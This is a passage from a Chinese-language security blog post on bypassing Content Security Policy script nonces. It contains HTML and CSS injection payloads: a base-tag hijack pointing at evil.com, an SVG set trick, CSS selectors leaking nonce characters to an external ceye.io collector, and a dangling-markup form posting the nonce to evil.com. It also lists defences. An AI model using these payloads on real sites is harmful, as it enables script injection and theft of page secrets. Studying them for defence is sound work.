<h3 id="bypass-nonce"><a href="#bypass-nonce" class="headerlink" title="bypass nonce"></a>bypass nonce</h3><h4 id="利用-lt-base-gt-标签"><a href="#利用-lt-base-gt-标签" class="headerlink" title="利用&lt;base&gt;标签"></a>利用<code>&lt;base&gt;</code>标签</h4><p>Specify a default URL and a default target for all links on a page:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;https://www.evil.com/&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;images/stickman.gif&quot;</span> <span class="attr">width</span>=<span class="string">&quot;24&quot;</span> <span class="attr">height</span>=<span class="string">&quot;39&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Stickman&quot;</span>&gt;</span><span class="comment">&lt;!-- load  https://www.evil.com/images/stickman.gif --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;tags/tag_base.asp&quot;</span>&gt;</span>HTML base Tag<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="comment">&lt;!-- point to https://www.evil.com/tags/tag_base.asp --&gt;</span></span><br></pre></td></tr></table></figure>

<p>因此我们可以设置个<code>&lt;base&gt;</code>标签，将相对路径导向恶意的网站</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- XSS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;https://evil.com/&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- End XSS --&gt;</span></span><br><span class="line">…</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;foo/bar.js&quot;</span> <span class="attr">nonce</span>=<span class="string">&quot;r4nd0m&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p><a target="_blank" rel="noopener" href="https://evil.com/foo/bar.js">https://evil.com/foo/bar.js</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(0000);</span><br></pre></td></tr></table></figure>

<p>成功执行</p>
<p>防御方式：</p>
<p>在csp中添加：base-uri ‘none’ 或 base-uri ‘self’</p>
<h4 id="利用chrome-bug-来修改script-src的值"><a href="#利用chrome-bug-来修改script-src的值" class="headerlink" title="利用chrome bug 来修改script src的值"></a>利用chrome bug 来修改script src的值</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- XSS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">set</span> <span class="attr">href</span>=<span class="string">&quot;victim&quot;</span> <span class="attr">attributeName</span>=<span class="string">&quot;href&quot;</span> <span class="attr">to</span>=<span class="string">&quot;data:,alert(1)&quot;</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- End XSS --&gt;</span></span><br><span class="line">…</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">&quot;victim&quot;</span> <span class="attr">src</span>=<span class="string">&quot;foo.js&quot;</span> <span class="attr">nonce</span>=<span class="string">&quot;r4nd0m&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>SVG中的set标签可以修改其他标签的属性值</p>
<p>该漏洞在chrome58中修复</p>
<h4 id="steal-nonce"><a href="#steal-nonce" class="headerlink" title="steal nonce"></a>steal nonce</h4><h5 id="via-CSS-selectors"><a href="#via-CSS-selectors" class="headerlink" title="via CSS selectors"></a>via CSS selectors</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- XSS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">script &#123; <span class="attribute">display</span>: block &#125;</span></span><br><span class="line"><span class="css">script<span class="selector-attr">[nonce^=<span class="string">&quot;a&quot;</span>]</span>:after &#123; content: <span class="built_in">url</span>(<span class="string">&quot;record?a&quot;</span>) &#125;</span></span><br><span class="line"><span class="css">script<span class="selector-attr">[nonce^=<span class="string">&quot;b&quot;</span>]</span>:after &#123; content: <span class="built_in">url</span>(<span class="string">&quot;record?b&quot;</span>) &#125;</span></span><br><span class="line"><span class="css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- End XSS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;foo/bar.js&quot;</span> <span class="attr">nonce</span>=<span class="string">&quot;r4nd0m&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以联合其他标签来发出请求，如<code>&lt;a&gt;</code> …</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css">script<span class="selector-attr">[nonce^=<span class="string">&quot;0&quot;</span>]</span>~<span class="selector-tag">a</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://y5pwcd.ceye.io/success&quot;</span>)&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>相关的css 语法</p>
<p> <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Selectors">https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Selectors</a> </p>
<p> <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Attribute_selectors">https://developer.mozilla.org/zh-CN/docs/Web/CSS/Attribute_selectors</a> </p>
<h5 id="via-dangling-markup-attack"><a href="#via-dangling-markup-attack" class="headerlink" title="via dangling markup attack"></a>via dangling markup attack</h5><p>破坏原有的结构，将script标签变成文本，诱使用户点击</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- XSS --&gt;</span> <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;//evil.com/form&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;click&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;nonce&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- End XSS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;foo/bar.js&quot;</span> <span class="attr">nonce</span>=<span class="string">&quot;r4nd0m&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="JS-framework-based-CSP-Bypasses"><a href="#JS-framework-based-CSP-Bypasses" class="headerlink" title="JS framework-based CSP Bypasses"></a>JS framework-based CSP Bypasses</h3><p>利用低版本JQuery等js框架漏洞来绕过csp</p>
<h2 id="绕过实例"><a href="#绕过实例" class="headerlink" title="绕过实例"></a>绕过实例</h2><h2 id="一些工具"><a href="#一些工具" class="headerlink" title="一些工具"></a>一些工具</h2><p>检查csp: <a target="_blank" rel="noopener" href="https://csp-evaluator.withgoogle.com/">https://csp-evaluator.withgoogle.com/</a> </p>
<p>常用可控jsonp: <a target="_blank" rel="noopener" href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180">https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180</a> </p>
<p><a target="_blank" rel="noopener" href="https://chrome.google.com/webstore/detail/csp-mitigator/gijlobangojajlbodabkpjpheeeokhfa">csp mitigator</a> :一个csp调试工具</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p> [Spagnuolo_Hack In Bo - So we broke all CSPs… You won’t guess what happened next!](<a target="_blank" rel="noopener" href="https://www.hackinbo.it/slides/1494231338_Spagnuolo_Hack">https://www.hackinbo.it/slides/1494231338_Spagnuolo_Hack</a> In Bo - So we broke all CSPs… You won’t guess what happened next!.pdf) </p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/423/">前端防御从入门到弃坑–CSP变迁</a></p>
<h2 id="收藏"><a href="#收藏" class="headerlink" title="收藏"></a>收藏</h2><p>Bypassing CSP script nonces via the browser cache： <a target="_blank" rel="noopener" href="http://sebastian-lekies.de/csp/attacker.php">http://sebastian-lekies.de/csp/attacker.php</a></p>
<p> <a target="_blank" rel="noopener" href="https://hurricane618.me/2018/06/30/csp-bypass-summary/">https://hurricane618.me/2018/06/30/csp-bypass-summary/</a> </p>
<p> <a target="_blank" rel="noopener" href="https://www.netsparker.com/blog/web-security/private-data-stolen-exploiting-css-injection/">https://www.netsparker.com/blog/web-security/private-data-stolen-exploiting-css-injection/</a> </p>
<p> <a target="_blank" rel="noopener" href="https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense">https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense</a> </p>
<p> <a target="_blank" rel="noopener" href="https://storage.googleapis.com/pub-tools-public-publication-data/pdf/45542.pdf">https://storage.googleapis.com/pub-tools-public-publication-data/pdf/45542.pdf</a> </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/bypass_csp/" data-id="cku8j3fh2003adan70u3pacln" data-title="bypass_csp" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/6/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/8/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/htb/" rel="tag">htb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">出题笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/LFI/" style="font-size: 10px;">LFI</a> <a href="/tags/RCE/" style="font-size: 10px;">RCE</a> <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 11.67px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 15px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/htb/" style="font-size: 10px;">htb</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/js/" style="font-size: 10px;">js</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php/" style="font-size: 11.67px;">php</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 16.67px;">web</a> <a href="/tags/wp/" style="font-size: 18.33px;">wp</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">出题笔记</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 11.67px;">域渗透</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">复现</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 13.33px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 10px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 11.67px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/10/01/%E5%9C%A8%E7%BA%BFoj%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE/">在线oj获取数据</a>
          </li>
        
          <li>
            <a href="/2021/10/01/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a>
          </li>
        
          <li>
            <a href="/2021/10/01/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/">巅峰极客</a>
          </li>
        
          <li>
            <a href="/2021/10/01/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020wp/">巅峰极客2020wp</a>
          </li>
        
          <li>
            <a href="/2021/10/01/%E6%88%91%E7%9A%842020/">我的2020</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2021 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>